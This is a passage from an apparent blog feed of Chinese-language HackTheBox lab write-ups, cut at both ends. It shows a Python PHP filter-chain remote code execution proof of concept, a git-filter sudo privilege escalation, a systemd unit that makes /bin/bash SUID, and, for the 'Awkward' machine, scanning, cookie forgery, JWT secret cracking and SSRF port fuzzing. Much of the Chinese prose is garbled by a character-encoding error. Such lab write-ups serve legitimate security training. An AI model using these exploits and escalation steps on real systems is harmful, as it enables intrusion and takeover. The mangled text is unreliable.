class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;include&quot;</span>,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63f9ceaff144a0100734d847.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9ceaff144a0100734d847.jpg"></a></p><p>æ­¤å¤„RCEçš„åŸç†ï¼ŒZeddå¸ˆå‚…çš„é‚£ç¯‡æ–‡ç« å·²ç»è§£é‡Šçš„å¾ˆæ¸…æ¥šäº†ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°ã€‚æŠŠä¸Šé¢ç»™å‡ºçš„POCç¨å¾®æ”¹ä¸€ä¸‹ï¼Œå°†php filter chainè¾“å‡ºå‡ºæ¥ï¼Œç„¶åurlç¼–ç ä½œä¸ºpageå‚æ•°çš„å€¼ä¼ å…¥ï¼Œå¹¶ä¼ å…¥å‚æ•°åä¸º0çš„å‚æ•°ï¼Œå€¼ä¸ºè¦æ‰§è¡Œå‘½ä»¤ï¼š</p><p><a href="https://pic.imgdb.cn/item/63f9cd7ef144a010073274c0.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cd7ef144a010073274c0.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°å‘½ä»¤è¢«æˆåŠŸæ‰§è¡Œï¼Œé‚£åå¼¹ä¸ªshellå§ï¼š</p><p><a href="https://pic.imgdb.cn/item/63f9cdc6f144a0100732f7e1.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cdc6f144a0100732f7e1.jpg"></a></p><h2 id="get-user"><a href="#get-user" class="headerlink" title="get user"></a>get user</h2><p>æ‰§è¡Œsudo -lï¼Œç»“æœå¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/63f9cdddf144a01007331ec4.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cdddf144a01007331ec4.jpg"></a></p><p>å¯ä»¥ä»¥svcç”¨æˆ·çš„èº«ä»½æ‰§è¡Œ&#x2F;var&#x2F;www&#x2F;image&#x2F;scripts&#x2F;git-commit.shè„šæœ¬ï¼Œçœ‹ä»¥ä¸‹è¿™ä¸ªè„šæœ¬å†…å®¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$u</span> ]]; <span class="keyword">then</span></span><br><span class="line">        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m <span class="string">&quot;Commited from API!&quot;</span> --author=<span class="string">&quot;james &lt;james@haxtables.htb&gt;&quot;</span>  --no-verify</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡å®¡è®¡è„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥æ»¥ç”¨identè¿‡æ»¤å™¨æ¥è®©å…¶æ‰§è¡Œæˆ‘ä»¬å†™å¥½çš„è„šæœ¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*.php filter=indent&#x27;</span> &gt; .git/info/attributes</span><br><span class="line">git config filter.indent.clean /tmp/shell.sh</span><br><span class="line">sudo -u svc /var/www/image/scripts/git-commit.sh</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63f9cdeff144a010073345ac.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cdeff144a010073345ac.jpg"></a></p><p>user.txtï¼š</p><p><a href="https://pic.imgdb.cn/item/63f9cdfff144a01007336994.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cdfff144a01007336994.jpg"></a></p><h2 id="get-root"><a href="#get-root" class="headerlink" title="get root"></a>get root</h2><p>sudo -læ‰§è¡Œç»“æœï¼š</p><p><a href="https://pic.imgdb.cn/item/63f9ce0af144a01007337dfe.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9ce0af144a01007337dfe.jpg"></a></p><p>å¾ˆå¸¸è§çš„ææƒé¢˜ç›®ï¼Œç¼–å†™&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;priv.serviceå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">svc@encoding:~$ cat /etc/systemd/system/priv.service</span><br><span class="line">[Service]</span><br><span class="line">Type=oneshot</span><br><span class="line">ExecStart=chmod u+s /bin/bash</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>æ¥ç€æ‰§è¡Œ<code>sudo systemctl restart priv</code>å³å¯ä»¥SUIDæ‰§è¡Œ&#x2F;bin&#x2F;bashï¼š</p><p><a href="https://pic.imgdb.cn/item/63f9ce17f144a01007339438.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9ce17f144a01007339438.jpg"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[hackthebox]Awkward Writeup</title>
      <link href="/2023/01/29/htb-awkawrd/"/>
      <url>/2023/01/29/htb-awkawrd/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿‡å¹´æœŸé—´ï¼Œé—²æ¥æ— äº‹ï¼Œæ‰“äº†ä¸€äº›htbçš„æœºå­ã€‚ç›®æ ‡æ˜¯åœ¨å¹´å‡æœŸé—´æ‰“åˆ°Hackerçº§åˆ«ï¼ˆå·²å®Œæˆï¼‰ï¼Œåé¢çš„Pro Hackerç­‰çº§ï¼Œæœ‰ç©ºé—²æ—¶é—´å†å†²å§ã€‚</p><p><a href="https://pic.imgdb.cn/item/63d5ed1fface21e9efe84628.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ed1fface21e9efe84628.jpg"></a></p><h2 id="é¢˜ç›®ä¿¡æ¯"><a href="#é¢˜ç›®ä¿¡æ¯" class="headerlink" title="é¢˜ç›®ä¿¡æ¯"></a>é¢˜ç›®ä¿¡æ¯</h2><p>ç­‰çº§ï¼šMedium</p><p>é¢˜ç›®åœ°å€ï¼š<a href="https://app.hackthebox.com/machines/Awkward">https://app.hackthebox.com/machines/Awkward</a></p><p><a href="https://pic.imgdb.cn/item/63d5ed2dface21e9efe85fda.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ed2dface21e9efe85fda.jpg"></a></p><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€[âœ—]â”€[root@parrot]â”€[/home/rainb0w/Desktop]</span><br><span class="line">â””â”€â”€â•¼ #nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.11.185</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-28 23:50 CST</span><br><span class="line">Nmap scan report for 10.10.11.185 (10.10.11.185)</span><br><span class="line">Host is up (0.26s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=1/28%OT=22%CT=1%CU=37376%PV=Y%DS=2%DC=T%G=Y%TM=63D5449</span><br><span class="line">OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(</span><br><span class="line">OS:O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11</span><br><span class="line">OS:NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(</span><br><span class="line">OS:R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS</span><br><span class="line">OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=</span><br><span class="line">OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=</span><br><span class="line">OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T</span><br><span class="line">OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=</span><br><span class="line">OS:S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 587/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   260.18 ms 10.10.14.1 (10.10.14.1)</span><br><span class="line">2   260.43 ms 10.10.11.185 (10.10.11.185)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 59.81 seconds</span><br></pre></td></tr></table></figure><h2 id="user-txt"><a href="#user-txt" class="headerlink" title="user.txt"></a>user.txt</h2><p>å¯ä»¥çœ‹åˆ°åªå¼€æ”¾äº†ä¸¤ä¸ªç«¯å£ï¼š22å’Œ80ã€‚ç›´æ¥è¿›å…¥80ç«¯å£ï¼Œå‘ç°ç½‘ç«™è¢«é‡å®šå‘åˆ°äº†<code>http://hat-valley.htb/</code>ï¼Œæˆ‘ä»¬å¯ä»¥å°†<code>hat-valley.htb</code>å†™å…¥hostsä¸­ã€‚æ¥ç€åˆ©ç”¨gobusterçˆ†ç ´ä¸€ä¸‹å­åŸŸååŠç›®å½•ï¼š</p><p><strong>å­åŸŸåæ‰«æ</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€[root@parrot]â”€[/home/rainb0w/Desktop]</span><br><span class="line">â””â”€â”€â•¼ #gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u hat-valley.htb -t 50</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:          http://hat-valley.htb</span><br><span class="line">[+] Threads:      50</span><br><span class="line">[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</span><br><span class="line">[+] User Agent:   gobuster/3.0.1</span><br><span class="line">[+] Timeout:      10s</span><br><span class="line">===============================================================</span><br><span class="line">2023/01/28 23:55:52 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">Found: store.hat-valley.htb (Status: 401) [Size: 188]</span><br><span class="line">===============================================================</span><br><span class="line">2023/01/28 23:56:21 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°ä¸€ä¸ªå­åŸŸå<code>store.hat-valley.htb</code>ï¼Œå°†å…¶ä¹Ÿå†™å…¥hostsã€‚</p><p>ç›®å½•çˆ†ç ´ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€[root@parrot]â”€[/home/rainb0w/Desktop]</span><br><span class="line">â””â”€â”€â•¼ #gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://hat-valley.htb/ -t 50</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://hat-valley.htb/</span><br><span class="line">[+] Threads:        50</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2023/01/28 23:57:12 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/static (Status: 301)</span><br><span class="line">/css (Status: 301)</span><br><span class="line">/js (Status: 301)</span><br><span class="line">===============================================================</span><br><span class="line">2023/01/29 00:17:59 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure><p>è¿›å…¥<code>http://hat-valley.htb/</code>ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ª<code>app.js</code>çš„æ•æ„Ÿæ–‡ä»¶ï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5ed3fface21e9efe8819e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ed3fface21e9efe8819e.jpg"></a></p><p>å‘ç°æœ‰ä¸€ä¸ª<code>/hr</code>è·¯å¾„ï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5ed53face21e9efe8a490.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ed53face21e9efe8a490.jpg"></a></p><p>å°è¯•è®¿é—®ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç™»é™†ç•Œé¢ï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5ed64face21e9efe8c530.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ed64face21e9efe8c530.jpg"></a></p><p>å‘ç°Cookieä¸ºtoken&#x3D;guestï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5ed75face21e9efe8e6cb.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ed75face21e9efe8e6cb.jpg"></a></p><p>å°è¯•å°†guestä¿®æ”¹ä¸ºadminï¼Œåˆ·æ–°é¡µé¢ï¼Œç™»é™†æˆåŠŸï¼</p><p><a href="https://pic.imgdb.cn/item/63d5ed84face21e9efe9090a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ed84face21e9efe9090a.jpg"></a></p><p>ä½†æ˜¯è¿™é‡Œä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ã€‚æŸ¥çœ‹networkæ ‡ç­¾é¡µï¼Œå‘ç°ä¸¤ä¸ªå¯ç–‘çš„è·¯å¾„ï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5ed96face21e9efe92bc6.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ed96face21e9efe92bc6.jpg"></a></p><p>åœ¨æ–°æ ‡ç­¾é¡µä¸­æ‰“å¼€è¿™ä¸¤ä¸ªè·¯å¾„ï¼Œå…¶ä¸­<code>/api/staff-details</code>æ˜¾ç¤ºå¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5eda3face21e9efe9468b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5eda3face21e9efe9468b.jpg"></a></p><p><code>/api/store-status?url=&quot;http:%2F%2Fstore.hat-valley.htb&quot;</code>æ˜¯ä¸ªç©ºç™½é¡µã€‚</p><p>åœ¨<code>/api/staff-details</code>ä¸­æç¤ºjwtæ ¼å¼é”™è¯¯ã€‚å°†tokenè®¾ä¸ºç©ºï¼Œå¯ä»¥çœ‹åˆ°ç”¨æˆ·çš„usernameåŠhashåŠ å¯†è¿‡çš„passwordï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5edb3face21e9efe9634e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5edb3face21e9efe9634e.jpg"></a></p><p>è¯•ç€æ”¾åœ¨crackstationä¸­çˆ†ç ´ä¸€ä¸‹ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5edc0face21e9efe97aa5.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5edc0face21e9efe97aa5.jpg"></a></p><p>æ‹¿åˆ°å…¶ä¸­ä¸€ä¸ªäººçš„passwordï¼Œå»ç™»é™†ä¸€ä¸‹ï¼Œå¾—åˆ°æ­£å¸¸ç”¨æˆ·çš„jwt:</p><p><a href="https://pic.imgdb.cn/item/63d5edcfface21e9efe99833.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5edcfface21e9efe99833.jpg"></a></p><p>æ¥ä¸‹æ¥å°è¯•çˆ†ç ´jwtçš„å¯†é’¥ï¼Œæˆ‘è¿™é‡Œåˆ©ç”¨çš„æ˜¯<code>[jwtcrack](https://github.com/Sjord/jwtcrack)</code>å·¥å…·ä¸­çš„<code>jwt2john.py</code>å’Œ<code>john</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5eddeface21e9efe9b544.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5eddeface21e9efe9b544.jpg"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€[root@parrot]â”€[/home/rainb0w/Desktop]</span><br><span class="line">â””â”€â”€â•¼ #john --wordlist=/usr/share/wordlists/rockyou.txt hash </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">123beany123      (?)</span><br><span class="line">1g 0:00:00:04 DONE (2023-01-29 00:16) 0.2444g/s 3259Kp/s 3259Kc/s 3259KC/s 123bettyboo..123arsenal123.</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¾—åˆ°å¯†é’¥<code>123beany123</code>ã€‚æ¥ç€æˆ‘ä»¬çœ‹ä¸€ä¸‹<code>/api/store-statu</code>sè·¯å¾„ï¼Œå¯ä»¥å‘ç°è¿™é‡Œå¯ä»¥ä¼ å…¥ä¸€ä¸ªurlå‚æ•°ï¼Œæ€€ç–‘å­˜åœ¨SSRFï¼Œè¯•ç€åˆ©ç”¨fileåè®®è¯»å–&#x2F;etc&#x2F;passwdï¼Œæœªæœã€‚è®¾url&#x3D;â€<a href="http://127.0.0.1:80"ï¼Œå‘ç°ç½‘ç«™è¢«é‡å®šå‘åˆ°äº†http://hat-valley.htb/ï¼Œå°è¯•FUZZä¸€ä¸‹å“ªäº›ç«¯å£è¢«å¼€æ”¾ï¼š">http://127.0.0.1:80&quot;ï¼Œå‘ç°ç½‘ç«™è¢«é‡å®šå‘åˆ°äº†http://hat-valley.htb/ï¼Œå°è¯•FUZZä¸€ä¸‹å“ªäº›ç«¯å£è¢«å¼€æ”¾ï¼š</a></p><p><a href="https://pic.imgdb.cn/item/63d5edf0face21e9efe9d850.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5edf0face21e9efe9d850.jpg"></a></p><p>FUZZç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€[root@parrot]â”€[/home/rainb0w/Desktop]</span><br><span class="line">â””â”€â”€â•¼ #ffuf -w /usr/share/SecLists/Fuzzing/4-digits-0000-9999.txt -u http://hat-valley.htb/api/store-status?url=%22http://127.0.0.1:FUZZ%22 -fs 0</span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\       </span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="line">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="line"></span><br><span class="line">       v1.4.1-dev</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://hat-valley.htb/api/store-status?url=%22http://127.0.0.1:FUZZ%22</span><br><span class="line"> :: Wordlist         : FUZZ: /usr/share/SecLists/Fuzzing/4-digits-0000-9999.txt</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span><br><span class="line"> :: Filter           : Response size: 0</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">0080                    [Status: 200, Size: 132, Words: 6, Lines: 9, Duration: 269ms]</span><br><span class="line">3002                    [Status: 200, Size: 77010, Words: 5916, Lines: 686, Duration: 292ms]</span><br><span class="line">8080                    [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 281ms]</span><br><span class="line">:: Progress: [10000/10000] :: Job [1/1] :: 147 req/sec :: Duration: [0:01:10] :: Errors: 0 ::</span><br></pre></td></tr></table></figure><p>å­˜åœ¨3ä¸ªç«¯å£ï¼š80ï¼Œ3002ï¼Œ8080ã€‚ä¼ å…¥<code>url=&quot;http://127.0.0.1:3002&quot;</code>ï¼Œå¯ä»¥çœ‹åˆ°è¯¥ç½‘ç«™çš„APIæ–‡æ¡£åŠæºç ï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5ee04face21e9efe9ff1b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ee04face21e9efe9ff1b.jpg"></a></p><p>å…¶ä¸­åœ¨<code>/api/all-leave</code>ä¸­å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 